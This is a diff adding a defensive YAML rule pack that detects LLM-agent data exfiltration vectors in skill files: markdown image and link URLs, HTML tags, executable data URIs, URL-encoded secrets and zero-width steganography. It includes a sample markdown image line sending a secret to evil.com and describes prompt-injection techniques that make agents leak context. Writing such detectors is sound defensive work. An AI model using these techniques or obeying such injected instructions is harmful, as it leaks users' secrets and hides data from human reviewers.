@@ -1,0 +1,135 @@
+# PromptGuard Data Protection Pack — LLM-Context Exfiltration Signatures
+# Source: https://github.com/promptguard/promptguard
+# Detects data exfiltration vectors specific to LLM/agent skill contexts.
+# These attacks exploit the agent's ability to render markdown, construct URLs,
+# or encode data in ways that bypass traditional network-level exfil detection.
+# Cisco's core pack covers Python/JS network calls but not these LLM-specific vectors.
+
+signatures:
+
+  - id: PG_EXFIL_MARKDOWN_IMAGE
+    category: data_exfiltration
+    severity: CRITICAL
+    patterns:
+      # Markdown image tags with dynamic data in the URL — classic LLM exfil vector
+      # Agent is tricked into rendering ![](https://evil.com/steal?data=<SECRET>)
+      - "!\\[([^\\]]*)\\]\\(https?://[^)]{0,200}\\{\\{?[^}]+\\}\\}?[^)]*\\)"
+      - "!\\[([^\\]]*)\\]\\(https?://[^)]{0,200}\\$\\{[^}]+\\}[^)]*\\)"
+      - "!\\[([^\\]]*)\\]\\(https?://[^)]{0,200}\\$[A-Za-z_][A-Za-z0-9_]*[^)]*\\)"
+      # Instructions to construct exfil URLs via markdown images
+      - "(?i)(render|display|show|output|create|generate|insert|embed)\\s+(a\\s+)?(?:markdown\\s+)?(?:image|img|picture)\\s+(?:with|where|containing|that\\s+includes?)\\s+.{0,80}(data|secret|key|token|password|env|variable|context|conversation|history|message)"
+    file_types: [markdown, text]
+    description: >
+      Markdown image exfiltration pattern detected. This attack tricks an LLM
+      agent into rendering a markdown image tag whose URL contains sensitive
+      data as query parameters. When the image is rendered, the data is sent
+      to an attacker-controlled server. This is one of the most common
+      LLM-specific exfiltration vectors and is not covered by Cisco's core
+      network-level exfil rules.
+      Source: https://github.com/promptguard/promptguard
+    remediation: >
+      Remove instructions that construct markdown images with dynamic data in
+      URLs. Implement output sanitization to strip or block markdown images
+      with variable interpolation in URLs.
+
+  - id: PG_EXFIL_MARKDOWN_LINK
+    category: data_exfiltration
+    severity: HIGH
+    patterns:
+      # Markdown links with template variables in URLs
+      - "\\[([^\\]]*)\\]\\(https?://[^)]{0,200}\\{\\{?[^}]+\\}\\}?[^)]*\\)"
+      - "(?i)(create|generate|render|output|insert)\\s+(a\\s+)?(?:markdown\\s+)?(?:link|hyperlink|anchor|url)\\s+.{0,60}(contain|include|embed|encode|append|attach)\\s+.{0,60}(data|secret|key|token|password|env|context|conversation|history)"
+    exclude_patterns:
+      # Legitimate template documentation
+      - "(?i)documentation"
+      - "(?i)template\\s+example"
+      - "(?i)mustache"
+      - "(?i)handlebars"
+    file_types: [markdown, text]
+    description: >
+      Markdown link exfiltration pattern detected. Similar to image exfil but
+      uses clickable links to smuggle data in URLs. The agent constructs a
+      link whose URL encodes sensitive context data.
+      Source: https://github.com/promptguard/promptguard
+    remediation: >
+      Remove instructions that embed sensitive data in markdown link URLs.
+      Review all dynamically constructed URLs for data leakage.
+
+  - id: PG_EXFIL_HTML_TAG
+    category: data_exfiltration
+    severity: HIGH
+    patterns:
+      # HTML img/script/iframe tags with dynamic data in src attributes
+      - "<img\\s+[^>]*src\\s*=\\s*[\"']https?://[^\"']{0,200}\\{\\{?[^}]+\\}\\}?[^\"']*[\"'][^>]*/?>|<img\\s+[^>]*src\\s*=\\s*[\"']https?://[^\"']{0,200}\\$\\{[^}]+\\}[^\"']*[\"'][^>]*/?>"
+      - "<(?:script|iframe|embed|object)\\s+[^>]*src\\s*=\\s*[\"']https?://[^\"']{0,300}[\"'][^>]*>"
+    exclude_patterns:
+      - "(?i)example"
+      - "(?i)documentation"
+      - "(?i)tutorial"
+    file_types: [markdown, text, javascript, typescript]
+    description: >
+      HTML tag injection with dynamic URL construction. Embeds sensitive data
+      in img/script/iframe src attributes to exfiltrate via HTTP requests
+      triggered when the content is rendered.
+      Source: https://github.com/promptguard/promptguard
+    remediation: >
+      Strip or escape HTML tags in skill content. Block skills that inject
+      raw HTML with external resource references.
+
+  - id: PG_EXFIL_DATA_URI
+    category: data_exfiltration
+    severity: HIGH
+    patterns:
+      # data: URIs with base64-encoded payloads — can smuggle data or execute scripts
+      - "data:(?:text/html|application/javascript|text/javascript|application/x-javascript);base64,[A-Za-z0-9+/=]{50,}"
+      # Instructions to encode and embed data in URIs
+      - "(?i)(encode|convert|transform|serialize)\\s+.{0,40}(to|as|into)\\s+.{0,20}(data\\s*(?::|URI)|base64\\s+(?:URI|url|data))"
+    exclude_patterns:
+      - "(?i)example"
+      - "(?i)documentation"
+      - "(?i)data:image/"
+    file_types: [markdown, text, python, javascript, typescript]
+    description: >
+      Data URI with executable MIME type detected. Data URIs with text/html
+      or JavaScript MIME types can execute scripts or render hidden content
+      to exfiltrate data without making visible network requests.
+      Source: https://github.com/promptguard/promptguard
+    remediation: >
+      Block data URIs with executable MIME types. Only allow data:image/* URIs
+      if image embedding is needed.
+
+  - id: PG_EXFIL_URL_ENCODING
+    category: data_exfiltration
+    severity: HIGH
+    patterns:
+      # Instructions to encode sensitive data into URLs
+      - "(?i)(append|add|include|embed|encode|put|insert|concatenate)\\s+.{0,60}(secret|password|token|api[_-]?key|credential|env|environment|context|conversation|history|system\\s+prompt|instruction)\\s+.{0,40}(to|in|into|as|within)\\s+.{0,30}(url|URI|link|query|parameter|endpoint|request)"
+      - "(?i)(url|URI|link|query|parameter|endpoint)\\s+.{0,40}(contain|include|embed|encode|carry|transmit)\\s+.{0,60}(secret|password|token|api[_-]?key|credential|env|context|conversation|system\\s+prompt)"
+    file_types: [markdown, text]
+    description: >
+      Instructions to encode sensitive data into URLs for exfiltration. The
+      skill directs the agent to construct URLs containing secrets, API keys,
+      or conversation context as query parameters or path segments.
+      Source: https://github.com/promptguard/promptguard
+    remediation: >
+      Remove all instructions that direct the agent to embed sensitive data
+      in URLs. Review the skill's data flow for unauthorized external
+      communication channels.
+
+  - id: PG_EXFIL_INVISIBLE_PAYLOAD
+    category: data_exfiltration
+    severity: CRITICAL
+    patterns:
+      # Instructions to hide exfiltration in invisible/whitespace/zero-width content
+      - "(?i)(hide|conceal|obscure|mask|cloak|disguise|camouflage|make\\s+invisible)\\s+.{0,60}(data|exfil|secret|key|token|password|context|output|response|payload|content)\\s+.{0,40}(in|within|inside|using|via|through)\\s+.{0,40}(whitespace|zero[- ]?width|invisible|hidden|unicode|steganograph|comment)"
+      - "(?i)(use|embed|encode|place|insert)\\s+.{0,40}(zero[- ]?width|invisible|hidden|unicode)\\s+.{0,40}(character|char|text|encoding)\\s+.{0,40}(to|for)\\s+.{0,40}(transmit|send|exfil|leak|smuggle|extract|hide)"
+    file_types: [markdown, text, python, javascript, typescript]
+    description: >
+      Instructions to use invisible characters or steganographic encoding to
+      hide exfiltrated data. This technique uses zero-width Unicode characters,
+      whitespace encoding, or HTML comments to create covert data channels
+      invisible to human reviewers.
+      Source: https://github.com/promptguard/promptguard
+    remediation: >
+      Remove all steganographic encoding instructions. Implement zero-width
+      character stripping on skill output.
